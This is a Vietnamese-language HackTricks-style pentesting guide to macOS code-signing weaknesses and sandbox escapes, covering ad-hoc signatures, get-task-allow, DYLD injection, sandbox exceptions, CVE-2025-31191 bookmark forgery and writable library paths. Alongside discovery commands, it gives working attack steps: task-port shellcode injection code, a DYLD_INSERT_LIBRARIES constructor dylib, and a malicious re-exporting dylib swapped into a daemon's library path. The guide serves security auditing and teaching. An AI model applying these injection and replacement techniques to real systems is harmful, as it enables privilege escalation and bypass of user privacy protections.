# Điểm yếu của Code Signing trên macOS & Sandbox Escape

{{#include ../../../banners/hacktricks-training.md}}

## Binary được ký Ad-Hoc

### Thông tin cơ bản

**Ad-hoc signing** (`CS_ADHOC`) tạo chữ ký mã **không có chuỗi chứng chỉ**. Chữ ký vẫn băm mã đã ký, nên quá trình xác thực có thể phát hiện việc sửa đổi, nhưng không cung cấp danh tính nhà phát triển để thành phần khác xác thực. Thay thế và ký lại executable sẽ tạo ra CodeDirectory/CDHash khác.<sup>[[1]](#references)[[4]](#references)</sup>

Trên máy Mac dùng Apple Silicon, mọi executable đều cần ít nhất chữ ký ad-hoc. Vì vậy, bạn sẽ thấy chữ ký ad-hoc trên nhiều công cụ phát triển, gói Homebrew và tiện ích của bên thứ ba.

### Vì sao điều này quan trọng

- **Không có danh tính người ký có thể xác minh** — các kiểm tra chỉ chấp nhận đường dẫn, trạng thái ad-hoc hoặc identifier chưa được ghim sẽ không thể xác định ai tạo ra binary.
- Binary ad-hoc của bên thứ ba nằm ở **vị trí đặc quyền** (FDA, daemon, helper) là mục tiêu ưu tiên cao nếu có thể ghi vào file hoặc thư mục cha.
- Kiểm tra TCC dựa trên CDHash, designated-requirement hoặc requirement **sẽ phát hiện việc thay thế**. Chính sách dựa trên đường dẫn có thể không phát hiện; hãy kiểm tra requirement thực tế và kiểm tra lại quyền được cấp thay vì cho rằng quyền đó vẫn còn sau khi ký lại.

### Khám phá

```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
  flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
  echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```

### Tấn công: Binary Replacement

```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```

---

## Tiến trình có thể debug (get-task-allow)

### Thông tin cơ bản

Entitlement **`com.apple.security.get-task-allow`** (hoặc flag `CS_GET_TASK_ALLOW`) cho phép debugger được ủy quyền lấy task port của tiến trình, ngay cả khi Hardened Runtime thường ngăn việc này. Debugger thành công có thể đọc bộ nhớ, sửa đổi các thanh ghi, inject code và điều khiển quá trình thực thi.<sup>[[3]](#references)</sup>

Entitlement này **chỉ dành cho các bản build phát triển**. Tuy nhiên, một số binary của bên thứ ba vẫn được phân phối kèm entitlement này trong môi trường production.

> [!CAUTION]
> Binary production có `get-task-allow` là một primitive khai thác mạnh. `taskgated`, danh tính của bên gọi, sandboxing, entitlement của debugger và quyền Developer Tools vẫn ảnh hưởng đến việc một client cụ thể có thể lấy task port hay không; hãy thử với cả `lldb`/`debugserver` và injector dự định sử dụng. Khi attach thành công, code được inject sẽ chạy với các entitlement, quyền TCC và ngữ cảnh bảo mật của mục tiêu.

### Phát hiện

```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
  codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```

### Tấn công: Task Port Injection

```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
    // Allocate memory in target process
    mach_vm_address_t addr = 0;
    mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);
    
    // Write shellcode into target
    mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);
    
    // Make it executable
    mach_vm_protect(task, addr, shellcode_size, FALSE,
                    VM_PROT_READ | VM_PROT_EXECUTE);
    
    // Create a remote thread to execute the shellcode
    // The shellcode runs with ALL of the target's entitlements and TCC grants
}
```

---

## Không xác thực thư viện + môi trường DYLD

### Xóa kiểm tra thư viện lúc runtime

Entitlement riêng **`com.apple.private.security.clear-library-validation`** không vô hiệu hóa kiểm tra thư viện khi process khởi chạy. Thay vào đó, entitlement này cho phép process gọi `csops(..., CS_OPS_CLEAR_LV, ...)` trên chính nó trong lúc chạy. Sau đó, XNU xóa `CS_REQUIRE_LV | CS_FORCED_LV`, với điều kiện caller có entitlement và đáp ứng các kiểm tra bổ sung của handler. Do đó, process chỉ có thể trở thành mục tiêu khả thi để library injection sau khi đi đến code path xóa kiểm tra thư viện.<sup>[[4]](#references)[[5]](#references)</sup>

### Tổ hợp nguy hiểm

Khi một binary có **cả hai** entitlement sau:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (tải bất kỳ dylib nào)
- `com.apple.security.cs.allow-dyld-environment-variables` (chấp nhận các biến môi trường DYLD)

Đây là tổ hợp có giá trị cao để code injection vì Hardened Runtime cho phép cả thư viện không đáng tin cậy lẫn biến môi trường DYLD. Tuy vậy, ngữ cảnh khởi chạy vẫn có thể loại bỏ các biến DYLD (ví dụ: trong các đường dẫn thực thi được bảo vệ hoặc có đặc quyền), vì vậy hãy xác minh chính xác cách gọi thay vì xem cặp entitlement này là điều kiện luôn được đáp ứng.

### Khám phá

```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "disable-library-validation.*true" && \
  echo "$ents" | grep -q "allow-dyld-environment.*true" && \
  echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```

### Tấn công: DYLD_INSERT_LIBRARIES Injection

```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
    // This runs BEFORE main() in the target's process
    // We inherit ALL of the target's:
    // - Entitlements
    // - TCC grants (camera, mic, FDA, etc.)
    // - Sandbox exceptions
    // - Mach port rights
    
    FILE *f = fopen("/tmp/injected_proof.txt", "w");
    fprintf(f, "Running as PID %d with target's privileges\n", getpid());
    fclose(f);
    
    // Example: if target has camera TCC, we can now capture video
    // Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```

---

## Các ngoại lệ tạm thời của Sandbox

### Chúng làm suy yếu Sandbox như thế nào

Các ngoại lệ tạm thời của Sandbox (`com.apple.security.temporary-exception.*`) tạo lỗ hổng trong App Sandbox:<sup>[[2]](#references)</sup>

| Ngoại lệ | Cho phép làm gì |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Kết nối với các dịch vụ XPC/Mach trên toàn hệ thống |
| `temporary-exception.files.absolute-path.read-write` | Đọc/ghi tệp bên ngoài vùng chứa của ứng dụng |
| `temporary-exception.iokit-user-client-class` | Mở kết nối IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Đọc tùy chọn của các ứng dụng khác |
| `temporary-exception.files.home-relative-path.read-write` | Truy cập các đường dẫn tương đối với `~` |

### Ngoại lệ Mach-Lookup = Primitive thoát Sandbox

Ngoại lệ nguy hiểm nhất là **mach-lookup** — nó cho phép ứng dụng bị sandbox giới hạn giao tiếp với các daemon có đặc quyền:

```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
  [ -f "$binary" ] && {
    ents=$(codesign -d --entitlements - "$binary" 2>&1)
    echo "$ents" | grep -q "mach-lookup" && {
      count=$(echo "$ents" | grep -c "mach-lookup")
      echo "[$count exceptions] $(basename "$1")"
    }
  }
' _ {} \; 2>/dev/null | sort -rn
```

### Tấn công: Sandbox Escape qua Mach-Lookup

```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
   a. Connect via NSXPCConnection
   b. Discover the service's protocol (class-dump, strings)
   c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```

---

## Kiểm tra Code-Signing không đồng nghĩa với tính toàn vẹn của XPC Client

Một XPC service có thể xác thực kết nối bằng cách trích xuất trạng thái code-signing từ audit token và chấp nhận **platform binary** của Apple hoặc client có `CS_REQUIRE_LV`/`CS_FORCED_LV`. Các kiểm tra này mô tả executable và một số process flag được chọn; chúng không chứng minh rằng address space hiện tại chỉ chứa code đáng tin cậy. Nghiên cứu trên các ImageCapture service cho thấy một Apple binary có thể bị inject, chẳng hạn `/bin/ls`, có thể tải dylib của attacker thông qua `DYLD_INSERT_LIBRARIES`, rồi kết nối với tư cách platform client. Một bước kiểm tra tiếp theo đối với library-validation flag cũng bị bypass trước khi Apple sửa service để yêu cầu private authorization entitlement trong macOS 15.<sup>[[6]](#references)</sup>

### Quy trình Audit Offensive

1. Reverse `listener:shouldAcceptNewConnection:` (hoặc XPC handler cấp thấp tương đương) và xác định các quyết định chỉ dựa trên `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV` hoặc `CS_FORCED_LV`.
2. Liệt kê các client được Apple ký có thể giao tiếp qua protocol, sau đó kiểm tra Hardened Runtime và entitlements. Chữ ký platform tự nó không chứng minh rằng DYLD injection bị chặn.
3. Kiểm tra ứng viên trên **bản dựng macOS mục tiêu**. Nếu constructor dylib được tải, hãy tạo kết nối tới service từ constructor đó để audit token thuộc về process platform được chấp nhận.
4. Kiểm tra lại mọi bản vá của vendor: thêm một mutable process-status flag khác vào cùng quyết định authorization có thể không loại bỏ được confused-deputy primitive.

```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```

> [!NOTE]
> Hành vi của DYLD, chính sách AMFI và các bước kiểm tra phía dịch vụ thay đổi giữa các bản phát hành macOS. Việc thất bại trên máy đã cài đầy đủ bản vá không chứng minh rằng cùng chuỗi khai thác cũng thất bại trên bản phát hành dễ bị tấn công.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Bookmark có phạm vi bảo mật lưu lại lựa chọn tệp của người dùng qua các lần khởi chạy. Sandbox extension gắn với lần khởi động, vì vậy `ScopedBookmarkAgent` xác thực extension này và tạo bookmark dài hạn được xác thực bằng HMAC; khi ứng dụng xuất trình bookmark đó sau này, agent xác thực nó và cấp sandbox extension mới. Bí mật ký được lưu trong login keychain và một khóa riêng cho từng ứng dụng được tạo dựa trên bundle identifier.<sup>[[7]](#references)</sup>

Trên các hệ thống bị ảnh hưởng, ACL của keychain ngăn tiến trình không đáng tin **đọc** bí mật `com.apple.scopedbookmarksagent.xpc`, nhưng không ngăn việc xóa mục này. Ứng dụng bị xâm nhập trong sandbox có thể thay mục đó bằng một bí mật đã biết và ACL do kẻ tấn công kiểm soát, suy ra khóa HMAC riêng cho ứng dụng, giả mạo các mục trong bookmark plist có thể ghi của container, rồi yêu cầu `ScopedBookmarkAgent` đổi chúng thành các extension cấp quyền truy cập tệp. Điều này biến mọi ứng dụng trong sandbox sử dụng bookmark có phạm vi bảo mật thành một nguy cơ sandbox escape cho phép truy cập tệp tùy ý mà không cần thêm lần tương tác nào với trình chọn tệp. Apple đã khắc phục sự cố trong các bản cập nhật bảo mật ngày 31 tháng 3 năm 2025.<sup>[[7]](#references)</sup>

### Phân loại và Chuỗi tấn công

```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
  "$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
  grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
  \( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```

Trình tự khai thác trên một host dễ bị tấn công là:

1. Có được khả năng thực thi mã bên trong một app bị sandbox có sử dụng persistent scoped bookmarks.
2. Thay signing item trong keychain của agent bằng một secret đã biết và ACL rộng quyền.
3. Tính `HMAC-SHA256(key=known_secret, data=bundle_id)` và giả mạo một bookmark trỏ đến đường dẫn hữu ích trong bookmark store có quyền ghi của app.
4. Kích hoạt luồng xử lý bookmark thông thường của ứng dụng để `ScopedBookmarkAgent` trả về một sandbox extension.
5. Dùng quyền truy cập file mới để ghi đè một mục tiêu thực thi hoặc dữ liệu ngoài sandbox có sẵn cho người dùng đó.

Đây là **kỹ thuật dành cho phiên bản đã được vá**: hãy dùng nó để hiểu ranh giới tin cậy và đánh giá các hệ thống chưa được vá, không nên mặc định rằng nó áp dụng cho các bản phát hành hiện tại. Khi kiểm thử hiện nay, hãy tập trung vào việc phân tích bookmark, liên kết danh tính, vòng đời của keychain item và hành vi confused-deputy quanh agent.

---

## Private Apple Entitlements

### Chúng là gì

Các entitlement có tiền tố `com.apple.private.*` cung cấp quyền truy cập vào **API nội bộ của Apple**, không được tài liệu hóa hoặc cung cấp cho nhà phát triển bên thứ ba. Binary của bên thứ ba có private entitlement thông qua enterprise cert, MDM hoặc hình thức phân phối ngoài App Store.

### Private Entitlement nguy hiểm

| Entitlement | Khả năng |
|---|---|
| `com.apple.private.tcc.manager` | Đọc/ghi toàn bộ cơ sở dữ liệu TCC |
| `com.apple.private.tcc.allow` | Truy cập các dịch vụ TCC cụ thể |
| `com.apple.private.security.no-sandbox` | Chạy không bị sandbox |
| `com.apple.private.iokit` | Truy cập trực tiếp driver IOKit |
| `com.apple.private.kernel.\*` | Truy cập giao diện kernel |
| `com.apple.private.xpc.launchd.job-label` | Đăng ký/quản lý các launchd job |
| `com.apple.rootless.install` | Ghi vào các đường dẫn được SIP bảo vệ |

### Khám phá

```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
  ents=$(codesign -d --entitlements - "{}" 2>&1)
  echo "$ents" | grep -q "com.apple.private" && {
    echo "=== {} ==="
    echo "$ents" | grep "com.apple.private" | head -10
  }
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```

---

## Các profile sandbox tùy chỉnh (SBPL)

### Chúng là gì

Các binary có thể đi kèm **profile sandbox tùy chỉnh** được viết bằng SBPL (Seatbelt Profile Language). Các profile này có thể hạn chế hơn HOẶC **ít hạn chế hơn** App Sandbox mặc định.

### Kiểm tra các profile tùy chỉnh

```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```

---

## Đường dẫn thư viện có thể ghi

### Chúng là gì

Khi một binary tải thư viện động từ đường dẫn mà người dùng hiện tại có thể **ghi vào**, thư viện đó có thể bị thay thế bằng mã độc.

### Phát hiện

```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
  [ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```

### Tấn công: Thay thế Dylib

```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
    system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
   -Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```



## References

- [1] [Apple Developer — Hướng dẫn Code Signing](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (các thao tác `CS_OPS_*` và `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (trình xử lý `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Kỷ nguyên mới của macOS Sandbox Escape: Khám phá bề mặt tấn công bị bỏ qua và tìm ra hơn 10 lỗ hổng mới](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Phân tích CVE-2025-31191: macOS sandbox escape dựa trên security-scoped bookmarks](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
